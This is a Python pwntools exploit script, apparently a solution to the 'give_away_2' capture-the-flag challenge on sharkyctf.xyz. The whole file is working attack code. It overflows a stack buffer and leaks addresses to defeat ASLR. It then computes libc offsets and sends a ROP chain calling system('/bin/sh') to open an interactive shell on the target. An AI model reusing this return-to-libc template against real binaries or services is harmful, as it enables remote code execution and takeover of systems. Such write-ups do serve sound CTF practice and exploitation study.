import sys
from pwn import *

host, port = 'sharkyctf.xyz', 20335
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.so')

if len(sys.argv) != 2:
    print('python {} <r:l:d>'.format(sys.argv[0]))
    exit(1)
elif sys.argv[1] not in ['r','l','d']:
    print('{} <r:l:d>'.format(sys.argv[0]))
    exit(1)
if sys.argv[1] == 'r':
    p = remote(host, port)
elif sys.argv[1] == 'l':
    p = remote('127.0.0.1', 1111) #local network
elif sys.argv[1] == 'd':
    p = process('./give_away_2')
    gdb.attach(p)
else:
    print('{} <r:l:d>'.format(sys.argv[0]))
    exit(1)


offset = 40

main = int(p.recvline().replace('\n', '').split(b' ')[-1],16)
log.info('main addr: {}'.format(hex(main)))
main_base = main - 0x864
log.info('main base : {}'.format(hex(main_base)))

payload = 'A'*offset
payload += p64(main+21)
payload += 'B'*offset
p.sendline(payload)

stdin_IO = int(p.recvline().replace('\n', '').split(b' ')[-1],16) - 0x83
log.info('_IO_2_1_stdin_: {}'.format(hex(stdin_IO)))
leak_base = (stdin_IO - libc.sym['_IO_2_1_stdin_']) + 0x254080
log.info('libc base: {}'.format(hex(leak_base)))
system = (leak_base + libc.sym['system']) - 0x2bbc0
log.info('system: {}'.format(hex(system)))
bin_sh = (leak_base + libc.search('/bin/sh\x00').next()) - 0x50cee
log.info('/bin/sh: {}'.format(hex(bin_sh)))

payload = 'C'*offset
payload += p64(main_base+0x903) # : pop rdi ; ret
payload += p64(bin_sh)
payload += p64(system)
p.sendline(payload)

p.interactive()
